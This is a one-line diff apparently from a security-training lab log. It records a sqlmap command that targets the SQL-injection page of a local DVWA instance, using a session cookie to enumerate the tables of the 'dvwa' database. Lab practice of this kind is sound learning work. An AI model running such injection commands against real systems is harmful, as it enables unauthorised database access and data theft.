@@ -1,0 +1,1 @@
+http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit (GET)  # /usr/bin/sqlmap -u http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit "--cookie=PHPSESSID=gcjfiju8bgsnjts5vsvpn223g1; security=high" -D dvwa --tables --batch --output-dir=outputs/day11_sqli_tables
